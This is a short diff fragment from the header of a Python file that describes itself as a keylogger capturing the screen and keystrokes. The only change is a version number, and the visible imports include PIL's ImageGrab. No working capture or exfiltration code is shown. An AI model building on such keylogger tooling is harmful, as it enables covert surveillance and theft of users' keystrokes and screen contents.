@@ -13,7 +13,7 @@
 # this keylogger captures the screen when the screen was a significant change, and save the keyboards
 __author__ = 'El3ct71k'
 __license__ = 'GPL v3'
-__version__ = '2.0'
+__version__ = '1.0'
 __email__ = 'El3ct71k@gmail.com'
 ########################################################
 from PIL import ImageGrab
